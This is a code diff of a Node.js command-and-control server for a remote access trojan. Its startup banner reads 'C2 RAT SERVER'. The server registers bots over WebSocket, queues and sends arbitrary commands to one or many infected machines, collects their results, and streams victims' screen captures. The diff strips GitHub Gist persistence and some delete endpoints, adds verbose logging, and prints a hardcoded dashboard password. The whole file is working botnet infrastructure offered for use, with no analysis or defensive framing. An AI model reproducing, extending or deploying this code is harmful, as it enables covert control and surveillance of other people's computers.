@@ -7,9 +7,6 @@ const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 
-// --- IMPORT GITHUB API ---
-const { Octokit } = require('@octokit/rest');
-
 // --- INIT ---
 const app = express();
 const server = http.createServer(app);
@@ -20,26 +17,8 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================================
-//  CONFIG GITHUB GIST
+//  DATABASE - MEMORY
 // ============================================================
-const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
-const GIST_ID = process.env.GIST_ID || '';
-const GIST_FILENAME = 'c2_db.json';
-
-// Khởi tạo Octokit
-let octokit = null;
-if (GITHUB_TOKEN && GIST_ID) {
-    octokit = new Octokit({ auth: GITHUB_TOKEN });
-    console.log('✅ GitHub Gist configured');
-} else {
-    console.log('⚠️ GitHub Gist not configured, using local backup only');
-}
-
-// ============================================================
-//  DATABASE - MEMORY + GITHUB GIST SYNC
-// ============================================================
-
-// 1. Dữ liệu trong bộ nhớ
 const DB = {
     bots: [],
     commands: [],
@@ -48,158 +27,8 @@ const DB = {
     admin_logs: []
 };
 
-// 2. Stream cache cho RAT
+// Stream cache
 const streamCache = new Map();
-
-// 3. Local backup path
-const BACKUP_PATH = path.join(__dirname, 'data', 'db.json');
-
-// Tạo thư mục data
-if (!fs.existsSync(path.dirname(BACKUP_PATH))) {
-    fs.mkdirSync(path.dirname(BACKUP_PATH), { recursive: true });
-}
-
-// ============================================================
-//  GITHUB GIST FUNCTIONS
-// ============================================================
-
-// Lấy dữ liệu từ Gist
-async function fetchFromGist() {
-    if (!octokit) return null;
-    try {
-        const response = await octokit.gists.get({
-            gist_id: GIST_ID
-        });
-        const files = response.data.files;
-        if (files && files[GIST_FILENAME]) {
-            const content = files[GIST_FILENAME].content;
-            return JSON.parse(content);
-        }
-        return null;
-    } catch (error) {
-        console.error('❌ Lỗi fetch từ Gist:', error.message);
-        return null;
-    }
-}
-
-// Lưu dữ liệu lên Gist
-async function saveToGist(data) {
-    if (!octokit) return false;
-    try {
-        const content = JSON.stringify(data, null, 2);
-        await octokit.gists.update({
-            gist_id: GIST_ID,
-            files: {
-                [GIST_FILENAME]: {
-                    content: content
-                }
-            }
-        });
-        console.log('✅ Đã sync lên GitHub Gist');
-        return true;
-    } catch (error) {
-        console.error('❌ Lỗi sync lên Gist:', error.message);
-        return false;
-    }
-}
-
-// ============================================================
-//  DATABASE OPERATIONS
-// ============================================================
-
-// Đọc database (ưu tiên Gist, fallback local)
-async function loadDatabase() {
-    // Thử lấy từ Gist trước
-    if (octokit) {
-        const gistData = await fetchFromGist();
-        if (gistData) {
-            console.log('✅ Load database từ GitHub Gist');
-            DB.bots = gistData.bots || [];
-            DB.commands = gistData.commands || [];
-            DB.pending_commands = gistData.pending_commands || [];
-            DB.rat_sessions = gistData.rat_sessions || [];
-            DB.admin_logs = gistData.admin_logs || [];
-            saveLocalBackup();
-            return;
-        }
-    }
-    
-    // Fallback: load từ local backup
-    try {
-        if (fs.existsSync(BACKUP_PATH)) {
-            const data = fs.readFileSync(BACKUP_PATH, 'utf8');
-            const parsed = JSON.parse(data);
-            DB.bots = parsed.bots || [];
-            DB.commands = parsed.commands || [];
-            DB.pending_commands = parsed.pending_commands || [];
-            DB.rat_sessions = parsed.rat_sessions || [];
-            DB.admin_logs = parsed.admin_logs || [];
-            console.log('✅ Load database từ local backup');
-            // Nếu có Gist, sync lên
-            if (octokit) {
-                saveToGist(DB).catch(() => {});
-            }
-            return;
-        }
-    } catch (e) {
-        console.log('⚠️ Không có local backup');
-    }
-    
-    console.log('📝 Tạo database mới');
-}
-
-// Lưu database (local + Gist)
-async function saveDatabase() {
-    // Lưu local backup
-    saveLocalBackup();
-    
-    // Sync lên Gist
-    if (octokit) {
-        await saveToGist(DB);
-    }
-}
-
-// Lưu local backup
-function saveLocalBackup() {
-    try {
-        const data = JSON.stringify({
-            bots: DB.bots,
-            commands: DB.commands,
-            pending_commands: DB.pending_commands,
-            rat_sessions: DB.rat_sessions,
-            admin_logs: DB.admin_logs
-        }, null, 2);
-        fs.writeFileSync(BACKUP_PATH, data);
-        return true;
-    } catch (e) {
-        console.error('❌ Lỗi local backup:', e);
-        return false;
-    }
-}
-
-// Sync database (gọi khi có thay đổi)
-async function syncDB() {
-    await saveDatabase();
-}
-
-// ============================================================
-//  AUTO SYNC - Mỗi 30 giây
-// ============================================================
-setInterval(async () => {
-    if (octokit) {
-        await saveToGist(DB).catch(() => {});
-    }
-}, 30000);
-
-// Sync khi shutdown
-process.on('SIGINT', async () => {
-    await saveDatabase();
-    process.exit();
-});
-process.on('SIGTERM', async () => {
-    await saveDatabase();
-    process.exit();
-});
 
 // ============================================================
 //  AUTH
@@ -227,6 +56,9 @@ wss.on('connection', (ws, req) => {
             const botId = data.bot_id;
             if (!botId) return;
 
+            console.log(`[WS] Received from ${botId}:`, data.type);
+
+            // === REGISTER ===
             if (data.type === 'register') {
                 botClients.set(botId, ws);
                 
@@ -248,19 +80,20 @@ wss.on('connection', (ws, req) => {
                 } else {
                     DB.bots.push(bot);
                 }
-                await syncDB();
 
+                // Gửi pending commands
                 const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
+                console.log(`[WS] Sending ${pendings.length} pending commands to ${botId}`);
                 pendings.forEach(p => {
                     sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                 });
                 DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);
-                await syncDB();
 
                 console.log(`[BOT] Registered: ${botId}`);
                 ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
             }
 
+            // === HEARTBEAT ===
             else if (data.type === 'heartbeat') {
                 const bot = DB.bots.find(b => b.bot_id === botId);
                 if (bot) {
@@ -269,29 +102,41 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
+            // === RESULT ===
             else if (data.type === 'result') {
-                const cmd = DB.commands.find(c => c.cmd_id === data.cmd_id);
-                if (cmd) {
-                    cmd.result = data.result;
-                    cmd.status = data.status || 'ok';
-                    cmd.executed_at = Date.now();
-                    await syncDB();
+                console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
+                
+                // Tìm command trong DB
+                const cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
+                if (cmdIndex !== -1) {
+                    DB.commands[cmdIndex].result = data.result;
+                    DB.commands[cmdIndex].status = data.status || 'ok';
+                    DB.commands[cmdIndex].executed_at = Date.now();
+                    console.log(`[RESULT] Updated command ${data.cmd_id}`);
+                } else {
+                    // Nếu không tìm thấy, tạo mới (fallback)
+                    console.log(`[RESULT] Command ${data.cmd_id} not found, creating new`);
+                    DB.commands.push({
+                        bot_id: botId,
+                        cmd_id: data.cmd_id,
+                        command: 'unknown',
+                        args: '[]',
+                        result: data.result,
+                        status: data.status || 'ok',
+                        issued_at: Date.now(),
+                        executed_at: Date.now()
+                    });
                 }
-                console.log(`[RESULT] ${botId}: ${data.cmd_id}`);
             }
 
+            // === RAT STREAM ===
             else if (data.type === 'rat_stream') {
+                // Lưu frame vào cache
                 streamCache.set(botId, {
                     frame: data.image,
                     timestamp: data.timestamp || Date.now()
                 });
-                if (streamCache.size > 100) {
-                    const keys = streamCache.keys();
-                    for (let i = 0; i < 50; i++) {
-                        const key = keys.next().value;
-                        if (key) streamCache.delete(key);
-                    }
-                }
+                // console.log(`[STREAM] Frame from ${botId}, cache size: ${streamCache.size}`);
             }
 
         } catch (e) {
@@ -299,15 +144,15 @@ wss.on('connection', (ws, req) => {
         }
     });
 
-    ws.on('close', async () => {
+    ws.on('close', () => {
         for (let [id, client] of botClients.entries()) {
             if (client === ws) {
                 botClients.delete(id);
                 const bot = DB.bots.find(b => b.bot_id === id);
                 if (bot) {
                     bot.online = 0;
-                    await syncDB();
                 }
+                console.log(`[BOT] Disconnected: ${id}`);
                 break;
             }
         }
@@ -316,13 +161,17 @@ wss.on('connection', (ws, req) => {
 
 function sendCommand(ws, botId, cmdId, command, args = []) {
     if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({
+        const payload = JSON.stringify({
             type: 'command',
             payload: { cmd_id: cmdId, command, args }
-        }));
+        });
+        ws.send(payload);
+        console.log(`[CMD] Sent to ${botId}: ${command} (${cmdId})`);
         return true;
+    } else {
+        console.log(`[CMD] Bot ${botId} not online, queuing`);
+        return false;
     }
-    return false;
 }
 
 // ============================================================
@@ -340,32 +189,24 @@ app.get('/api/bots/online', auth, (req, res) => {
 });
 
 // Xóa bot
-app.delete('/api/bots/:bot_id', auth, async (req, res) => {
+app.delete('/api/bots/:bot_id', auth, (req, res) => {
     DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
     DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
     DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== req.params.bot_id);
-    await syncDB();
     res.json({ status: 'deleted' });
 });
 
-// Xóa tất cả bot
-app.delete('/api/bots', auth, async (req, res) => {
-    DB.bots = [];
-    DB.commands = [];
-    DB.pending_commands = [];
-    await syncDB();
-    res.json({ status: 'all_deleted' });
-});
-
 // Gửi lệnh
-app.post('/api/command', auth, async (req, res) => {
+app.post('/api/command', auth, (req, res) => {
     const { bot_id, command, args = [] } = req.body;
     if (!bot_id || !command) {
         return res.status(400).json({ error: 'Missing bot_id or command' });
     }
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
-    DB.commands.push({
+    
+    // Lưu command vào DB
+    const cmdEntry = {
         bot_id: bot_id,
         cmd_id: cmdId,
         command: command,
@@ -374,14 +215,17 @@ app.post('/api/command', auth, async (req, res) => {
         status: 'pending',
         issued_at: Date.now(),
         executed_at: null
-    });
-    await syncDB();
+    };
+    DB.commands.push(cmdEntry);
+    console.log(`[API] Command saved: ${cmdId} for ${bot_id}`);
 
+    // Gửi command
     const ws = botClients.get(bot_id);
     if (ws && ws.readyState === WebSocket.OPEN) {
         sendCommand(ws, bot_id, cmdId, command, args);
         res.json({ status: 'sent', cmd_id: cmdId });
     } else {
+        // Lưu vào pending
         DB.pending_commands.push({
             bot_id: bot_id,
             cmd_id: cmdId,
@@ -389,20 +233,20 @@ app.post('/api/command', auth, async (req, res) => {
             args: JSON.stringify(args),
             issued_at: Date.now()
         });
-        await syncDB();
+        console.log(`[API] Command queued for ${bot_id}`);
         res.json({ status: 'queued', cmd_id: cmdId });
     }
 });
 
 // Gửi lệnh hàng loạt
-app.post('/api/command/bulk', auth, async (req, res) => {
+app.post('/api/command/bulk', auth, (req, res) => {
     const { bot_ids, command, args = [] } = req.body;
     if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
         return res.status(400).json({ error: 'Missing bot_ids array' });
     }
 
     const results = [];
-    for (const botId of bot_ids) {
+    bot_ids.forEach(botId => {
         const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
         DB.commands.push({
             bot_id: botId,
@@ -429,21 +273,32 @@ app.post('/api/command/bulk', auth, async (req, res) => {
             });
             results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
         }
-    }
-    await syncDB();
+    });
+
     res.json({ results });
 });
 
 // Lấy kết quả lệnh
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
-    res.json(cmd || {});
+    if (cmd) {
+        console.log(`[API] Result for ${req.params.cmd_id}: ${cmd.status}`);
+        res.json(cmd);
+    } else {
+        console.log(`[API] Command ${req.params.cmd_id} not found`);
+        res.json({});
+    }
 });
 
 // Lấy kết quả cuối (cho RAT)
 app.get('/api/results/latest/:bot_id', auth, (req, res) => {
-    const cached = streamCache.get(req.params.bot_id);
+    const botId = req.params.bot_id;
+    console.log(`[API] Getting latest for ${botId}`);
+    
+    // 1. Lấy từ stream cache trước
+    const cached = streamCache.get(botId);
     if (cached && cached.frame) {
+        console.log(`[API] Returning cached frame for ${botId}`);
         return res.json({
             cmd_id: 'stream-latest',
             result: cached.frame,
@@ -452,10 +307,18 @@ app.get('/api/results/latest/:bot_id', auth, (req, res) => {
         });
     }
     
-    const cmd = DB.commands
-        .filter(c => c.bot_id === req.params.bot_id && c.command === 'sc')
-        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0))[0];
-    res.json(cmd || {});
+    // 2. Fallback: lấy từ command sc gần nhất
+    const cmds = DB.commands
+        .filter(c => c.bot_id === botId && c.command === 'sc')
+        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
+    
+    if (cmds.length > 0) {
+        console.log(`[API] Returning latest sc command for ${botId}`);
+        res.json(cmds[0]);
+    } else {
+        console.log(`[API] No data for ${botId}`);
+        res.json({});
+    }
 });
 
 // Lấy lịch sử
@@ -472,37 +335,9 @@ app.get('/api/commands', auth, (req, res) => {
     res.json(DB.commands);
 });
 
-// Xóa command
-app.delete('/api/commands/:cmd_id', auth, async (req, res) => {
-    DB.commands = DB.commands.filter(c => c.cmd_id !== req.params.cmd_id);
-    await syncDB();
-    res.json({ status: 'deleted' });
-});
-
 // Lấy pending commands
 app.get('/api/pending', auth, (req, res) => {
     res.json(DB.pending_commands);
-});
-
-// Xóa pending command
-app.delete('/api/pending/:cmd_id', auth, async (req, res) => {
-    DB.pending_commands = DB.pending_commands.filter(p => p.cmd_id !== req.params.cmd_id);
-    await syncDB();
-    res.json({ status: 'deleted' });
-});
-
-// Lấy admin logs
-app.get('/api/logs', auth, (req, res) => {
-    const limit = parseInt(req.query.limit) || 100;
-    const logs = DB.admin_logs.sort((a, b) => b.timestamp - a.timestamp).slice(0, limit);
-    res.json(logs);
-});
-
-// Xóa logs
-app.delete('/api/logs', auth, async (req, res) => {
-    DB.admin_logs = [];
-    await syncDB();
-    res.json({ status: 'cleared' });
 });
 
 // ============================================================
@@ -524,7 +359,6 @@ app.post('/api/rat/start', auth, (req, res) => {
         socket_id: 'ws-' + Date.now(),
         session_start: Date.now()
     });
-    syncDB();
 
     const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
     sendCommand(ws, bot_id, cmdId, 'rat_start', []);
@@ -532,7 +366,7 @@ app.post('/api/rat/start', auth, (req, res) => {
 });
 
 // RAT STOP
-app.post('/api/rat/stop', auth, async (req, res) => {
+app.post('/api/rat/stop', auth, (req, res) => {
     const { bot_id } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });
 
@@ -543,7 +377,6 @@ app.post('/api/rat/stop', auth, async (req, res) => {
     }
     DB.rat_sessions = DB.rat_sessions.filter(r => r.bot_id !== bot_id);
     streamCache.delete(bot_id);
-    await syncDB();
     res.json({ status: 'rat_stopped', bot_id });
 });
 
@@ -592,68 +425,28 @@ app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
 });
 
 // ============================================================
-//  DATABASE MANAGEMENT API (WEB EDIT)
+//  DATABASE MANAGEMENT
 // ============================================================
 
-// Xem toàn bộ database
 app.get('/api/db', auth, (req, res) => {
     res.json(DB);
 });
 
-// Xem từng bảng
 app.get('/api/db/bots', auth, (req, res) => res.json(DB.bots));
 app.get('/api/db/commands', auth, (req, res) => res.json(DB.commands));
 app.get('/api/db/pending', auth, (req, res) => res.json(DB.pending_commands));
-app.get('/api/db/sessions', auth, (req, res) => res.json(DB.rat_sessions));
-app.get('/api/db/logs', auth, (req, res) => res.json(DB.admin_logs));
 
-// Thêm bot (POST)
-app.post('/api/db/bots', auth, async (req, res) => {
-    const botData = req.body;
-    if (!botData.bot_id) {
-        return res.status(400).json({ error: 'Missing bot_id' });
-    }
-    const existing = DB.bots.findIndex(b => b.bot_id === botData.bot_id);
-    if (existing !== -1) {
-        DB.bots[existing] = { ...DB.bots[existing], ...botData };
-    } else {
-        DB.bots.push(botData);
-    }
-    await syncDB();
-    res.json({ status: 'added', bot: botData });
-});
-
-// Cập nhật bot (PUT)
-app.put('/api/db/bots/:bot_id', auth, async (req, res) => {
-    const botId = req.params.bot_id;
-    const idx = DB.bots.findIndex(b => b.bot_id === botId);
-    if (idx === -1) {
-        return res.status(404).json({ error: 'Bot not found' });
-    }
-    DB.bots[idx] = { ...DB.bots[idx], ...req.body };
-    await syncDB();
-    res.json({ status: 'updated', bot: DB.bots[idx] });
-});
-
-// Xóa toàn bộ database
-app.delete('/api/db', auth, async (req, res) => {
+app.delete('/api/db', auth, (req, res) => {
     DB.bots = [];
     DB.commands = [];
     DB.pending_commands = [];
     DB.rat_sessions = [];
     DB.admin_logs = [];
-    await syncDB();
-    res.json({ status: 'all_cleared' });
-});
-
-// Sync manual (force sync lên Gist)
-app.post('/api/db/sync', auth, async (req, res) => {
-    await saveDatabase();
-    res.json({ status: 'synced', gist: !!octokit });
+    res.json({ status: 'cleared' });
 });
 
 // ============================================================
-//  DASHBOARD ROUTES
+//  DASHBOARD
 // ============================================================
 
 app.get('/', (req, res) => {
@@ -669,20 +462,19 @@ app.get('/style.css', (req, res) => {
 });
 
 // ============================================================
-//  START SERVER
+//  START
 // ============================================================
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', async () => {
+server.listen(PORT, '0.0.0.0', () => {
     console.log('='.repeat(50));
-    console.log('  C2 RAT SERVER STARTED');
+    console.log('  C2 RAT SERVER STARTED (FIXED)');
     console.log(`  Port: ${PORT}`);
     console.log(`  Dashboard: http://localhost:${PORT}/`);
     console.log(`  RAT Control: http://localhost:${PORT}/rat`);
     console.log(`  Password: H3XTEK0`);
-    console.log(`  GitHub Gist: ${octokit ? '✅ Connected' : '❌ Not configured'}`);
     console.log('='.repeat(50));
-    
-    // Load database
-    await loadDatabase();
+    console.log('  Bot clients: 0');
+    console.log('  Commands: 0');
+    console.log('='.repeat(50));
 });
